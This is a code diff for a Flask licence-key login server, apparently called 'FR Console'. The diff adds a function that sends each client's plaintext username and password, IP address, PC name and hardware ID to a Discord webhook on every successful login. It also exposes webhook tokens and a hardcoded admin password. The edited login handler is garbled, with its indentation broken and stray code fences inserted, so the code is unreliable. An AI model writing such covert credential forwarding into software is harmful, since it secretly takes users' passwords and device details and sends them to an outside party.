@@ -13,8 +13,8 @@ LICENSE_KEYS = {
     "HARSH": {"hwid": ""},
     "PRINCE": {"hwid": ""}
 }
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1447209038256537782/g87uTQhj03vK4wdwhyoETk7Wc2BcQW_kLQqyrs1RWludMv1hB9dDTVwGWBhnrH67XwKg"
-
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482347636932608061/78cGhgwcz47pkLu1nOOPozfxedGJ4hzUJIq88fGDIOxGbZ_SQAi5Wp9-354np203_UYd"
+DISCORD_WEBHOOKK = "https://discord.com/api/webhooks/1482348028038742181/EpByNd1j3fCsQqZiAPvrEnFyvLrv0MKqgRLRldPPm7AI78uq2oZF98_Bp-OkS9aPhVJ4"
 ADMIN_USERNAME = "FR"
 ADMIN_PASSWORD = "PUSSY"
 
@@ -192,7 +192,29 @@ def send_login_info():
 def load_data():
     data = load_data_raw()
     return clean_expired_users(data)
+def send_client_login(username, password, ip, hwid, pc_name):
 
+    data = {
+        "embeds": [
+            {
+                "title": "🔐 Client Login",
+                "color": 16711680,
+                "fields": [
+                    {"name": "Username", "value": username, "inline": False},
+                    {"name": "Password", "value": password, "inline": False},
+                    {"name": "IP Address", "value": ip, "inline": False},
+                    {"name": "PC Name", "value": pc_name, "inline": False},
+                    {"name": "HWID", "value": hwid, "inline": False},
+                    {"name": "Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
+                ],
+                "footer": {
+                    "text": "FR Console Client Login"
+                }
+            }
+        ]
+    }
+
+    requests.post(DISCORD_WEBHOOKK, json=data)
 # -------------------- AUTH --------------------
 # -------------------- AUTH --------------------
 @app.route("/ping", methods=["POST"])
@@ -521,51 +543,67 @@ def get_users():
 
 @app.route("/client_login", methods=["POST"])
 def client_login():
-    data = load_data()
+data = load_data()
 
-    category = request.form["category"]
-    username = request.form["username"]
-    password = request.form["password"]
-    hwid = request.form["hwid"]
+```
+category = request.form["category"]
+username = request.form["username"]
+password = request.form["password"]
+hwid = request.form["hwid"]
 
-    if category not in data:
-        return jsonify({"status": "error", "message": "Application not found"})
+# NEW
+ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+if ip:
+    ip = ip.split(",")[0].strip()
 
-    for user in data[category]:
+pc_name = request.form.get("pcname", "Unknown")
 
-        if user["Username"].lower() == username.lower():
+if category not in data:
+    return jsonify({"status": "error", "message": "Application not found"})
 
-            if user["Password"].lower() != password.lower():
-                return jsonify({"status": "error", "message": "Wrong password"})
+for user in data[category]:
 
-            if is_expired(user["Expiry"]):
-                data[category] = [u for u in data[category] if u["Username"] != user["Username"]]
-                save_data(data)
-                return jsonify({"status": "error", "message": "Account expired"})
+    if user["Username"].lower() == username.lower():
 
-            if user["Status"] != "Active":
-                return jsonify({"status": "error", "message": "Account paused"})
+        if user["Password"].lower() != password.lower():
+            return jsonify({"status": "error", "message": "Wrong password"})
 
-            if not user["HWID"]:
-                user["HWID"] = hwid
-                save_data(data)
+        if is_expired(user["Expiry"]):
+            data[category] = [u for u in data[category] if u["Username"] != user["Username"]]
+            save_data(data)
+            return jsonify({"status": "error", "message": "Account expired"})
 
-                return jsonify({
-                    "status": "success",
-                    "message": "HWID bound. Login success",
-                    "expiry": user["Expiry"]
-                })
+        if user["Status"] != "Active":
+            return jsonify({"status": "error", "message": "Account paused"})
 
-            if user["HWID"] != hwid:
-                return jsonify({"status": "error", "message": "HWID mismatch"})
+        if not user["HWID"]:
+            user["HWID"] = hwid
+            save_data(data)
+
+            # WEBHOOK
+            send_client_login(username, password, ip, hwid, pc_name)
 
             return jsonify({
                 "status": "success",
-                "message": "Login success",
+                "message": "HWID bound. Login success",
                 "expiry": user["Expiry"]
             })
 
-    return jsonify({"status": "error", "message": "Username does not exist"})
+        if user["HWID"] != hwid:
+            return jsonify({"status": "error", "message": "HWID mismatch"})
+
+        # WEBHOOK
+        send_client_login(username, password, ip, hwid, pc_name)
+
+        return jsonify({
+            "status": "success",
+            "message": "Login success",
+            "expiry": user["Expiry"]
+        })
+
+return jsonify({"status": "error", "message": "Username does not exist"})
+```
+
 
 @app.route("/reset_hwid", methods=["POST"])
 def reset_hwid():
